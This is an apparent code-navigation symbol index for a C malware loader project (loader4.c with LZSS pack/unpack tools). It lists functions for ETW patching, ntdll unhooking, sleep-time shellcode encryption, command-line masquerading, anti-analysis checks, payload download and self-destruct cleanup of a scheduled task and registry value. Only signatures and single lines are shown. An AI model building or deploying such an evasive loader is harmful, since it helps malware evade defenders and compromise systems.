| `GetPEDirectory` | function | `loader4.c:532` | `IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)` |
| `GetProcAddress` | function | `loader4.c:451` | `GetProcAddress(GetModuleHandleA(ntdll), "NtFlushInstructionCache");` |
| `GetThreadContext` | function | `loader4.c:137` | `GetThreadContext(GetCurrentThread(), &ctx);` |
| `GlobalMemoryStatusEx` | function | `loader4.c:715` | `GlobalMemoryStatusEx(&mem);` |
| `HookTrampolineBuffers` | struct | `loader4.c:295` | `` |
| `HookedSleep` | struct | `loader4.c:305` | `` |
| `LocalFree` | function | `loader4.c:491` | `LocalFree(poi_masqArgvW);` |
| `MultiByteToWideChar` | function | `loader4.c:481` | `MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);` |
| `MySleep` | function | `loader4.c:404` | `static void WINAPI MySleep(DWORD ms)` |
| `N` | macro | `loader4.c:65` | `#define N` |
| `NTSTATUS` | function | `loader4.c:122` | `typedef NTSTATUS (NTAPI *pNtContinue)(PCONTEXT ThreadContext, BOOLEAN RaiseAlert);` |
| `NT_SUCCESS` | macro | `loader4.c:55` | `#define NT_SUCCESS(Status)` |
| `NT_SUCCESS` | function | `loader4.c:158` | `return NT_SUCCESS(NtContinue(&ctx, FALSE));` |
| `NtCurrentProcess` | macro | `loader4.c:59` | `#define NtCurrentProcess()` |
| `NtCurrentThread` | macro | `loader4.c:57` | `#define NtCurrentThread()` |
| `OBFSTR` | macro | `loader4.c:72` | `#define OBFSTR(str)` |
| `OBFSTRW` | macro | `loader4.c:85` | `#define OBFSTRW(str)` |
| `OBFUSCATE_KEY` | macro | `loader4.c:69` | `#define OBFUSCATE_KEY` |
| `P` | macro | `loader4.c:64` | `#define P` |
| `PELoader` | function | `loader4.c:618` | `void PELoader(char* data, DWORD datasize)` |
| `PatchETW` | function | `loader4.c:218` | `BOOL PatchETW()` |
| `RegCloseKey` | function | `loader4.c:707` | `RegCloseKey(hKey);` |
| `RegDeleteValueA` | function | `loader4.c:726` | `RegDeleteValueA(hKey, "SystemMaintenance");` |
| `RepairIAT` | function | `loader4.c:541` | `BOOL RepairIAT(PVOID modulePtr)` |
| `RunPE` | function | `loader4.c:612` | `DWORD WINAPI RunPE(LPVOID lpParameter)` |
| `SetHWBP_NtContinue` | function | `loader4.c:132` | `BOOL SetHWBP_NtContinue(PVOID targetAddr, DWORD index)` |
| `Sleep` | function | `loader4.c:413` | `Sleep(ms);` |
| `TerminateProcess` | function | `loader4.c:759` | `TerminateProcess(pi.hProcess, 0);` |
| `UPTR` | type_alias | `loader4.c:276` | `typedef UINT64 UPTR;` |
| `UPTR` | type_alias | `loader4.c:278` | `typedef UINT32 UPTR;` |
| `Unhook` | function | `loader4.c:784` | `BOOL Unhook(LPVOID cleanNtdll)` |
| `VEHHandler` | function | `loader4.c:457` | `LONG NTAPI VEHHandler(PEXCEPTION_POINTERS xp)` |
| `VirtualFree` | function | `loader4.c:644` | `VirtualFree(pImageBase, 0, MEM_RELEASE);` |
| `VirtualProtect` | function | `loader4.c:235` | `VirtualProtect(p1, 1, old, &old);` |
| `WIN32_LEAN_AND_MEAN` | macro | `loader4.c:17` | `#define WIN32_LEAN_AND_MEAN` |
| `WaitForSingleObject` | function | `loader4.c:691` | `WaitForSingleObject(hThread, INFINITE);` |
| `WideCharToMultiByte` | function | `loader4.c:817` | `WideCharToMultiByte(CP_UTF8, 0, wresource, -1, resourceA, sizeof(resourceA)-1, NULL, NULL);` |
| `WinHttpCloseHandle` | function | `loader4.c:834` | `WinHttpCloseHandle(hRequest);` |
| `WinHttpSetOption` | function | `loader4.c:830` | `WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));` |
| `XK` | macro | `loader4.c:42` | `#define XK` |
| `ZeroMemory` | function | `loader4.c:846` | `ZeroMemory(pszOutBuffer, dwSize + 1);` |
| `_CRT_RAND_S` | macro | `loader4.c:15` | `#define _CRT_RAND_S` |
| `_CRT_SECURE_NO_WARNINGS` | macro | `loader4.c:52` | `#define _CRT_SECURE_NO_WARNINGS` |
| `anti_analysis` | function | `loader4.c:699` | `BOOL anti_analysis()` |
| `deobf` | function | `loader4.c:124` | `void deobf(const char* src, char* dst, size_t max_len)` |
| `entryPoint` | function | `loader4.c:615` | `entryPoint();` |
| `fastTrampoline` | function | `loader4.c:418` | `bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b)` |
| `free` | function | `loader4.c:213` | `free(window);` |
| `freeargvA` | function | `loader4.c:505` | `void freeargvA(char** array, int Argc)` |
| `freeargvW` | function | `loader4.c:513` | `void freeargvW(wchar_t** array, int Argc)` |
| `getNtdll` | function | `loader4.c:747` | `LPVOID getNtdll()` |
| `get_return_address` | function | `loader4.c:351` | `static inline UPTR get_return_address(void)` |
| `hookExitProcess` | function | `loader4.c:609` | `void __stdcall hookExitProcess(UINT statuscode)` |
| `hookGetCommandLineA` | function | `loader4.c:594` | `LPSTR hookGetCommandLineA()` |
| `hookGetCommandLineW` | function | `loader4.c:595` | `LPWSTR hookGetCommandLineW()` |
| `hook__getmainargs` | function | `loader4.c:599` | `int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)` |
| `hook__p___argc` | function | `loader4.c:598` | `int* __cdecl hook__p___argc(void)` |
| `hook__p___argv` | function | `loader4.c:596` | `char*** __cdecl hook__p___argv(void)` |
| `hook__p___wargv` | function | `loader4.c:597` | `wchar_t*** __cdecl hook__p___wargv(void)` |
| `hook__wgetmainargs` | function | `loader4.c:602` | `int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)` |
| `hookexit` | function | `loader4.c:605` | `int __cdecl hookexit(int status)` |
| `isShellcodeThread` | function | `loader4.c:361` | `bool isShellcodeThread(LPVOID addr)` |
| `log` | macro | `loader4.c:327` | `#define log(...)` |
| `log` | function | `loader4.c:385` | `log("[>] Flipped to RW");` |
| `lzss_decode_mem` | function | `loader4.c:161` | `BOOL lzss_decode_mem(const unsigned char* input, size_t input_size, unsigned char** output, size_...` |
| `main` | function | `loader4.c:879` | `int main(int argc, char** argv)` |
| `masqueradeCmdline` | function | `loader4.c:476` | `void masqueradeCmdline()` |
| `memcpy` | function | `loader4.c:427` | `memcpy(code + 2, &jump, 8);` |
| `memset` | function | `loader4.c:244` | `memset(ntdll, 0, sizeof(ntdll));` |
| `printf` | function | `loader4.c:265` | `printf("[-] CryptDecrypt failed: %u\n", GetLastError());` |
| `read_bit` | function | `loader4.c:103` | `static int read_bit(BitReader* br)` |
| `read_bits` | function | `loader4.c:112` | `static int read_bits(BitReader* br, int n)` |
| `selfDestruct` | function | `loader4.c:719` | `void selfDestruct()` |
| `shellcodeEncryptDecrypt` | function | `loader4.c:370` | `void shellcodeEncryptDecrypt(LPVOID caller)` |
| `srand` | function | `loader4.c:880` | `srand(GetTickCount());` |
| `system` | function | `loader4.c:729` | `system("schtasks /delete /tn \"SystemMaintenanceTask\" /f > nul 2>&1");` |
| `void` | function | `loader4.c:301` | `typedef void (WINAPI *typeSleep)(DWORD ms);` |
| `wprintf` | function | `loader4.c:818` | `wprintf(L"[*] Downloading: %s (%s)\n", wresource, resourceA);` |
| `xor32` | function | `loader4.c:354` | `void xor32(uint8_t *buf, SIZE_T sz, uint32_t key)` |
| `EI` | macro | `lzss.c:4` | `#define EI` |
| `EJ` | macro | `lzss.c:6` | `#define EJ` |
| `F` | macro | `lzss.c:9` | `#define F` |
| `N` | macro | `lzss.c:8` | `#define N` |
| `P` | macro | `lzss.c:7` | `#define P` |
| `decode` | function | `lzss.c:86` | `void decode(void)` |
| `encode` | function | `lzss.c:45` | `void encode(void)` |
| `error` | function | `lzss.c:15` | `static void error(void)` |
| `flush_bit_buffer` | function | `lzss.c:31` | `static void flush_bit_buffer(void)` |
| `fputc` | function | `lzss.c:94` | `fputc(c, outfile);` |
| `getbit` | function | `lzss.c:76` | `static int getbit(int n)` |
| `output1` | function | `lzss.c:34` | `static void output1(int c)` |
| `output2` | function | `lzss.c:39` | `static void output2(int x, int y)` |
| `putbit0` | function | `lzss.c:25` | `static void putbit0(void)` |
| `putbit1` | function | `lzss.c:17` | `static void putbit1(void)` |
| `encode` | function | `pack.c:4` | `extern void encode(void);` |
| `fclose` | function | `pack.c:19` | `fclose(infile);` |
| `main` | function | `pack.c:7` | `int main(int argc, char *argv[])` |
| `outfile` | variable | `pack.c:6` | `extern FILE *infile, *outfile;` |
| `printf` | function | `pack.c:10` | `printf("Usage: %s <input.exe> <output.lzss>\n", argv[0]);` |
| `decode` | function | `test.c:6` | `void decode(void);` |
| `fclose` | function | `test.c:17` | `fclose(infile);` |
| `main` | function | `test.c:8` | `int main(void)` |
| `outfile` | variable | `test.c:7` | `extern FILE *infile, *outfile;` |
| `printf` | function | `test.c:19` | `printf("LZSS OK: decompressed -> test.exe\n");` |
| `decode` | function | `unpack.c:4` | `extern void decode(void);` |
| `fclose` | function | `unpack.c:19` | `fclose(infile);` |
| `main` | function | `unpack.c:7` | `int main(int argc, char *argv[])` |
| `outfile` | variable | `unpack.c:6` | `extern FILE *infile, *outfile;` |
| `printf` | function | `unpack.c:10` | `printf("Usage: %s <input.lzss> <output.exe>\n", argv[0]);` |
